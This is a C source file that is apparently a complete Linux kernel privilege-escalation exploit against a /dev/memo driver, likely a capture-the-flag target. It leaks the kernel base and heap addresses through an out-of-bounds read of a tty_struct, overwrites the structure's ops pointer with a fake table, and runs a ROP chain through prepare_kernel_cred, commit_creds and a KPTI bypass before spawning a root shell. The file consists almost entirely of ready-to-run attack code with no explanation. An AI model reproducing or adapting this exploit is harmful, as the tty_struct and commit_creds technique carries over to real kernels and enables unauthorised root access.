#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <pthread.h>
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/userfaultfd.h>
#include <linux/prctl.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/timerfd.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/shm.h>

#define DEV_PATH "/dev/memo"
#define ulong unsigned long
#define uint unsigned int
#define scu static const unsigned long

ulong kbase;
ulong user_cs,user_ss,user_rsp,user_rflags;

void fatal(char *msg){
  printf("[!] Err: %s\n", msg);
  exit(-1);
}

void root_shell(void) {
  puts("[+] spawning root shell...");
  char *argv[] = {"/bin/sh", NULL};
  char *envp[] = {NULL};
  execve("/bin/sh",argv,envp);
}
static void save_state() {
  asm(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
      :
      : "memory");
}

int main() {
  char buf[0x400] = {};
  save_state();
  puts("[+] UserLand state saved !");

  int fd = open(DEV_PATH, O_RDWR);
  if (fd == -1)
    fatal(DEV_PATH);

  // allocate tty_struct at kheap
  puts("[+] allocate tty_struct");
  int ptmx_fd = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
  if (ptmx_fd == -1)
    fatal("/dev/ptmx");

  // kernel address leak
  puts("[+] lseek +0x100");
  lseek(fd, 0x100, SEEK_SET);
  read(fd, buf, sizeof(buf));
  //for debug
  /*
  for (int i=0; i < 0x400; i+=8) {
    printf("[+0x%x] 0x%016lx\n", i, *(ulong*)&buf[i]);
  }
  */
  // buf[0x318] == tty_struct.ops
  kbase = *(ulong*)&buf[0x318] - 0xe65900;
  printf("[i] kbase: 0x%016lx\n", kbase);
  // buf[0x338] == tty_struct.read_wait.next
  ulong chunk_base = *(ulong*)&buf[0x338] - 0x438;
  printf("[i] chunk base@kheap: 0x%016lx\n", chunk_base);
  // making fake tty_struct
  ulong push_r12_add_ptr_rbp_41h_pop_rsp_pop_r13_ret = kbase + 0x94d4e3;
  *(ulong*)(buf + 8 * 12) = push_r12_add_ptr_rbp_41h_pop_rsp_pop_r13_ret;
  // tty_struct.ops -> fake_table
  *(ulong*)(buf + 0x318) = chunk_base + 0x100;
  // krop chain
  ulong prepare_kernel_cred = kbase + 0x7bb50;
  ulong commit_creds = kbase + 0x7b8b0;
  ulong rop_bypass_kpti = kbase + 0xa00a45;
  ulong rop_rdi_ret = kbase + 0xf866;
  ulong rop_rcx_ret = kbase + 0x4c852;
  ulong rop_mov_rdi_rax_rep_movsq_ret = kbase + 0x19dcb;
  ulong* chain = (ulong*)&buf[0x70];
  *chain++ = rop_rdi_ret;
  *chain++ = 0;
  *chain++ = prepare_kernel_cred;
  *chain++ = rop_rcx_ret;
  *chain++ = 0;
  *chain++ = rop_mov_rdi_rax_rep_movsq_ret;
  *chain++ = commit_creds;
  *chain++ = rop_bypass_kpti;
  *chain++ = 0xdeadbeef;
  *chain++ = 0xdeadbeef;
  *chain++ = (unsigned long)&root_shell;
  *chain++ = user_cs;
  *chain++ = user_rflags;
  *chain++ = user_rsp;
  *chain++ = user_ss;

  //for debug
  /*
  for (int i=0; i < 0x400; i+=8) {
    printf("[+0x%x] 0x%016lx\n", i, *(ulong*)&buf[i]);
  }
  */
  lseek(fd, 0x100, SEEK_SET);
  write(fd, buf, sizeof(buf));
  ioctl(ptmx_fd, chunk_base + 0x70 + 0x100 - 8, chunk_base + 0x70 + 0x100 - 8);
  return 0;
}
